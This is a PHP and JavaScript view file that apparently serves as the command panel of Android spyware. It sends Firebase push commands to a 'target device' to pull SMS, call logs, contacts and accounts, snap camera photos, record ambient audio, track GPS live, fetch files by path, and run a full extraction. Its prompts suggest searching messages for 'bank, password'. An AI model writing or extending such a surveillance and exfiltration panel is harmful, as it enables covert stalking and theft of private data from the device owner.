<?php /** @var array|null $targetDevice */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device</h1>
                        <span class="badge badge-primary border p-2"><i class="fas fa-signal mr-1"></i> Interactive Control</span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Trigger data extraction and remote synchronization</p>
                </div>
                <div class="col-lg-5 text-right">
                    <span class="text-muted"><i class="fas fa-clock mr-1"></i> Live Session</span>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <div class="card card-primary card-outline shadow-sm">
                        <div class="card-header">
                            <h3 class="card-title"><i class="fas fa-terminal mr-2"></i>Command Center</h3>
                            <div class="card-tools">
                                <?php if ($targetDevice): ?>
                                    <span class="badge badge-dark border mr-2" title="Target Device">
                                        <i class="fas fa-mobile-alt text-success mr-1"></i> 
                                        <?= htmlspecialchars($targetDevice['device_model'] ?? 'Unknown Device') ?>
                                    </span>
                                    <script>const activeFcmToken = <?= json_encode($targetDevice['fcm_token'] ?? '') ?>;</script>
                                <?php else: ?>
                                    <span class="badge badge-warning border mr-2">
                                        <i class="fas fa-exclamation-circle mr-1"></i> No Active Device
                                    </span>
                                    <script>const activeFcmToken = '';</script>
                                <?php endif; ?>
                                <span class="badge badge-info mr-2" id="status-display" style="display:none;">Ready</span>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="row text-center" id="command-grid">
                                <?php
                                $commands = [
                                    // Primary Communications & Data
                                    ['id' => 'sms',          'label' => 'Fetch SMS',     'icon' => 'fas fa-sms',           'color' => '#007bff', 'desc' => 'All SMS messages'],
                                    ['id' => 'calls',        'label' => 'Call Logs',     'icon' => 'fas fa-phone-alt',     'color' => '#28a745', 'desc' => 'Full history'],
                                    ['id' => 'contacts',     'label' => 'Contacts',      'icon' => 'fas fa-address-book',  'color' => '#17a2b8', 'desc' => 'Full contact list'],
                                    ['id' => 'search_data',  'label' => 'Keyword Search','icon' => 'fas fa-search',        'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],

                                    // Media & Files
                                    ['id' => 'capture_photo','label' => 'Camera Snap',   'icon' => 'fas fa-camera',        'color' => '#d81b60', 'desc' => 'Remote photo capture'],
                                    ['id' => 'record_audio', 'label' => 'Ambient Audio', 'icon' => 'fas fa-microphone',    'color' => '#ff8f00', 'desc' => 'Record environment audio'],
                                    ['id' => 'files',        'label' => 'File List',     'icon' => 'fas fa-file-alt',      'color' => '#20c997', 'desc' => 'Recent files'],
                                    ['id' => 'fetch_file',   'label' => 'Targeted File', 'icon' => 'fas fa-file-download', 'color' => '#00897b', 'desc' => 'Fetch specific file path'],

                                    // Location & Movement
                                    ['id' => 'location',     'label' => 'GPS Location',  'icon' => 'fas fa-map-marker-alt','color' => '#dc3545', 'desc' => 'Precise activity'],
                                    ['id' => 'start_tracking','label' => 'Live Tracking','icon' => 'fas fa-route',         'color' => '#e53935', 'desc' => 'Real-time GPS tracking'],
                                    ['id' => 'context',      'label' => 'Context',       'icon' => 'fas fa-walking',       'color' => '#e83e8c', 'desc' => 'Motion & state'],

                                    // Apps & Usage
                                    ['id' => 'apps',         'label' => 'Apps List',     'icon' => 'fas fa-th-large',      'color' => '#6f42c1', 'desc' => 'Installed apps'],
                                    ['id' => 'usage',        'label' => 'App Usage',     'icon' => 'fas fa-chart-pie',     'color' => '#6610f2', 'desc' => 'Screen-time stats'],
                                    ['id' => 'notifications','label' => 'Alerts',        'icon' => 'fas fa-bell',          'color' => '#ffc107', 'desc' => 'Status bar alerts'],

                                    // Device & Hardware
                                    ['id' => 'device_info',  'label' => 'Device Info',   'icon' => 'fas fa-info-circle',   'color' => '#6c757d', 'desc' => 'Hardware & build'],
                                    ['id' => 'sensors',      'label' => 'Sensors',       'icon' => 'fas fa-microchip',     'color' => '#117a8b', 'desc' => 'Sensor profile'],
                                    ['id' => 'network',      'label' => 'Network',       'icon' => 'fas fa-wifi',          'color' => '#0056b3', 'desc' => 'WiFi & connection'],
                                    ['id' => 'bluetooth',    'label' => 'Bluetooth',     'icon' => 'fab fa-bluetooth-b',   'color' => '#4e73df', 'desc' => 'Nearby devices'],

                                    // Misc & Utilities
                                    ['id' => 'calendar',     'label' => 'Calendar',      'icon' => 'fas fa-calendar-alt',  'color' => '#fd7e14', 'desc' => 'Events & tasks'],
                                    ['id' => 'accounts',     'label' => 'Accounts',      'icon' => 'fas fa-user-circle',   'color' => '#343a40', 'desc' => 'System accounts'],
                                    ['id' => 'beep',         'label' => 'Test Beep',     'icon' => 'fas fa-volume-up',     'color' => '#8e44ad', 'desc' => 'Play a beep sound'],

                                    // Global Action
                                    ['id' => 'all',          'label' => 'Sync All',      'icon' => 'fas fa-sync-alt',      'color' => '#b21f2d', 'desc' => 'Full extraction'],
                                ];

                                foreach ($commands as $cmd):
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-4">
                                    <button class="btn btn-block btn-remote-cmd p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center" 
                                            data-cmd="<?= $cmd['id'] ?>" 
                                            style="border-radius: 12px; transition: all 0.3s; background: #fff;">
                                        <div class="cmd-icon-wrapper mb-2" style="color: <?= $cmd['color'] ?>; font-size: 2rem;">
                                            <i class="<?= $cmd['icon'] ?>"></i>
                                        </div>
                                        <h6 class="font-weight-bold mb-1 text-dark"><?= $cmd['label'] ?></h6>
                                        <small class="text-muted d-none d-sm-block"><?= $cmd['desc'] ?></small>
                                    </button>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                        <div class="card-footer bg-light">
                            <div class="d-flex align-items-center flex-wrap">
                                <i class="fas fa-info-circle text-info mr-2"></i>
                                <small class="text-muted">Commands are sent via Google Firebase Cloud Messaging (FCM). The device must be online to receive commands.</small>
                                <?php if (!empty($recentUploadSources)): ?>
                                    <span class="ml-auto d-flex align-items-center">
                                        <i class="fas fa-cloud-upload-alt text-muted mr-1"></i>
                                        <?php foreach ($recentUploadSources as $src): ?>
                                            <?php
                                                $badgeClass = match($src['upload_source']) {
                                                    'manual' => 'badge-primary',
                                                    'auto_sync' => 'badge-secondary',
                                                    'web_initiated' => 'badge-success',
                                                    default => 'badge-secondary',
                                                };
                                            ?>
                                            <span class="badge <?= $badgeClass ?> mr-1" title="Last 7 days">
                                                <?= str_replace('_', ' ', $src['upload_source']) ?>: <?= $src['count'] ?>
                                            </span>
                                        <?php endforeach; ?>
                                    </span>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</div>

<style>
    .btn-remote-cmd:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 20px rgba(0,0,0,0.1) !important;
        border-color: #007bff !important;
    }
    .btn-remote-cmd:active {
        transform: translateY(-2px);
    }
    .btn-remote-cmd.loading {
        opacity: 0.7;
        pointer-events: none;
    }
    .btn-remote-cmd.loading i {
        animation: spin 1s linear infinite;
    }
    @keyframes spin {
        100% { transform: rotate(360deg); }
    }
    .cmd-icon-wrapper {
        width: 60px;
        height: 60px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(0,0,0,0.02);
        border-radius: 50%;
        transition: all 0.3s;
    }
    .btn-remote-cmd:hover .cmd-icon-wrapper {
        background: rgba(0,123,255,0.05);
    }
</style>

<!-- Toastr CSS & JS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<script>
$(function() {
    $('.btn-remote-cmd').on('click', function() {
        const $btn = $(this);
        const cmd = $btn.data('cmd');
        const $icon = $btn.find('.cmd-icon-wrapper i');
        const originalIcon = $icon.attr('class') || $btn.find('i').attr('class');
        
        const executeCommand = (extraData = {}) => {
            if ($btn.hasClass('loading')) return; // Prevent double-clicks

            // UI Feedback
            $btn.addClass('loading').prop('disabled', true);
            $icon.attr('class', 'fas fa-spinner fa-spin');
            $btn.find('i').attr('class', 'fas fa-spinner fa-spin'); // Fallback
            $('#status-display').fadeIn().removeClass('badge-danger badge-success').addClass('badge-info').text('Sending ' + cmd + '...');

            const resetBtn = () => {
                $btn.removeClass('loading').prop('disabled', false);
                $icon.attr('class', originalIcon);
                $btn.find('i').attr('class', originalIcon); // Fallback
                setTimeout(() => $('#status-display').fadeOut(), 5000);
            };

            const apiUrl = `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}`;

            $.ajax({
                url: apiUrl,
                method: 'POST',
                data: extraData,
                dataType: 'json',
                timeout: 120000, // 120 seconds timeout
                success: function(response) {
                    resetBtn(); // Guarantee animation stops first
                    
                    // Check if response has success == true
                    if (response && response.success == true) {
                        toastr.success('Successful');
                        $('#status-display').removeClass('badge-info').addClass('badge-success').text('Sent: ' + cmd);
                    } else {
                        toastr.error((response && response.message) ? response.message : 'Failed to send command');
                        $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Error: ' + cmd);
                    }
                },
                error: function(xhr, status, error) {
                    resetBtn(); // Guarantee animation stops first
                    
                    let errorMessage = 'Network error. Please try again.';
                    
                    if (status === 'timeout') {
                        errorMessage = 'Request timed out after 2 minutes. The device might be offline.';
                    } else if (xhr.responseJSON) {
                        // Attempt to parse server JSON error payload
                        if (xhr.responseJSON.message) {
                            errorMessage = xhr.responseJSON.message;
                        } else if (xhr.responseJSON.messages && xhr.responseJSON.messages.error) {
                            errorMessage = xhr.responseJSON.messages.error;
                        }
                    }
                    
                    toastr.error(errorMessage);
                    $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Failed');
                }
            });
        };

        if (cmd === 'fetch_file') {
            Swal.fire({
                title: 'Targeted File Fetch',
                text: 'Enter the exact file path (e.g., /sdcard/Download/secret.pdf):',
                input: 'text',
                showCancelButton: true,
                confirmButtonText: 'Fetch File',
                inputValidator: (value) => {
                    if (!value) return 'File path is required!';
                }
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ file_path: result.value });
                }
            });
        } else if (cmd === 'search_data') {
            Swal.fire({
                title: 'Targeted Data Search',
                text: 'Enter the keyword to search for in SMS/Calls (e.g., bank, password):',
                input: 'text',
                showCancelButton: true,
                confirmButtonText: 'Search',
                inputValidator: (value) => {
                    if (!value) return 'Keyword is required!';
                }
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ keyword: result.value });
                }
            });
        } else if (cmd === 'start_tracking') {
             Swal.fire({
                title: 'Live Tracking',
                text: 'Enter duration in minutes (e.g., 60):',
                input: 'number',
                inputAttributes: { min: 1, max: 1440 },
                showCancelButton: true,
                confirmButtonText: 'Start Tracking',
                inputValue: 60
            }).then((result) => {
                if (result.isConfirmed && result.value) {
                    executeCommand({ duration_minutes: result.value });
                }
            });
        } else {
            executeCommand();
        }
    });
});
</script>

<?php include __DIR__ . '/_adv_style.php'; ?>
